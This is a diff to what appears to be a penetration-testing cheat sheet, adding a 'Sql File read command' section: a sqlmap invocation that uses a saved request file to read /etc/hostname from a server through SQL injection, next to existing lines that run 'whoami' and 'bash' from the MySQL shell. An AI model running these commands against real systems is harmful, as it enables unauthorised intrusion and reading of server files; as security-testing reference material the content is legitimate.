@@ -119,3 +119,10 @@ We can run the system command in MySQL shell as below. Depending on the situatio
 mysql> system whoami
 mysql> system bash
 ```
+
+
+#### Sql File read command
+
+```
+sqlmap -r login.req --batch --threads 10 --file-read=/etc/hostname
+```
